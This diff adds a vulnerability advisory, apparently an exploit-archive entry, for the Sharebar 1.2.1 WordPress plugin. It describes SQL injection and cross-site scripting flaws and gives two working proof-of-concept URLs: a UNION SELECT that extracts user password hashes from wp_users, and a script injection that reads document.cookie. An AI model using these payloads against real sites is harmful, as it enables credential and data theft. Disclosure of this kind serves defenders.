@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/53532/info
+
+Sharebar plugin for WordPress is prone to multiple cross-site scripting and SQL-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Sharebar 1.2.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/wp-admin/options-general.php?page=Sharebar&amp;t=edit&amp;id=1 AND 1=0 UNION SELECT 1,2,3,4,user_pass,6 FROM wp_users WHERE ID=1
+
+http://www.example.com/wp-content/plugins/sharebar/sharebar-admin.php?status=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E 
